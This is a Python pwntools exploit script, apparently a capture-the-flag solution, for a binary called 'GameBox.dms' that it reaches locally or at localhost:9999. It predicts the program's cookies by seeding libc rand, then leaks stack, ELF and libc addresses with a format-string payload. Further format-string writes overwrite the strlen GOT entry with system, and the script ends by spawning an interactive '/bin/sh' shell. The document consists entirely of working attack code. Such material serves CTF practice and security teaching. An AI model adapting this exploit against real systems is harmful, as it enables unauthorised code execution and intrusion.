#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
from ctypes import CDLL
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./GameBox.dms")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./GameBox.dms")
    libc = elf.libc


else:
    io = remote("localhost", 9999)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def Play(length, name):
    io.sendlineafter("xit\n", "P")
    cookie = []
    for i in xrange(24):
        cookie.append(chr(dll.rand() % 26 + ord('A')))

    cookie = "".join(cookie)
    #  print cookie
    io.sendlineafter(":\n", cookie)
    io.sendlineafter(":\n", str(length))
    io.sendafter(":\n", name)
    return cookie

def Delete(idx, cookie):
    io.sendlineafter("xit\n", "D")
    io.sendlineafter(":\n", str(idx))
    io.sendlineafter(":\n", cookie)

def Show():
    io.sendlineafter("xit\n", "S")

if __name__ == "__main__":
    dll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    dll.srand(1)

    cookie = Play(120, "%8$p..%9$p..%13$p..\0")
    Show()
    io.recvuntil("0x")
    stack = int(io.recvuntil("..", drop = True), 16) - 0x20
    success("stack -> {:#x}".format(stack))
    elf.address = int(io.recvuntil("..", drop = True), 16) - 0x18d5
    success("elf.address -> {:#x}".format(elf.address))
    libc.address = int(io.recvuntil("..", drop = True), 16) - libc.sym['__libc_start_main'] - 241
    success("libc.address -> {:#x}".format(libc.address))
    pause()
    Delete(0, cookie)

    payload = "%{}c%{}$hn".format((stack + 0x20) & 0xffff, 0x9 + 6)
    payload += "%{}c%{}$hn".format(2, 0x17 + 6)
    cookie = Play(120, payload + '\0')
    Show()
    Delete(0, cookie)

    payload = "%{}c%{}$hhn".format((elf.got['strlen'] >> 16 & 0xff), 0x25 + 6)
    payload += "%{}c%{}$hn".format((elf.got['strlen'] & 0xffff) - (elf.got['printf'] >> 16 & 0xff), 0x23 + 6)
    cookie = Play(120, payload + '\0')
    Show()
    Delete(0, cookie)

    payload = "%{}c%{}$hn".format((stack + 0x48) & 0xffff, 0x9 + 6)
    payload += "%{}c%{}$hn".format(2, 0x17 + 6)
    cookie = Play(120, payload + '\0')
    Show()
    Delete(0, cookie)

    payload = "%{}c%{}$hhn".format(((elf.got['strlen'] + 2) >> 16 & 0xff), 0x25 + 6)
    payload += "%{}c%{}$hn".format(((elf.got['strlen'] + 2) & 0xffff) - (elf.got['printf'] >> 16 & 0xff), 0x23 + 6)
    cookie = Play(120, payload + '\0')
    Show()
    Delete(0, cookie)

    #  DEBUG()
    payload = "%{}c%{}$hhn".format((libc.sym['system'] >> 16 & 0xff), 0xb + 6)
    payload += "%{}c%{}$hn".format((libc.sym['system'] & 0xffff) - (libc.sym['system'] >> 16 & 0xff), 0x6 + 6)
    cookie = Play(120, payload + '\0')
    Show()

    Play(120, "/bin/sh\0")

    io.interactive()
    io.close()
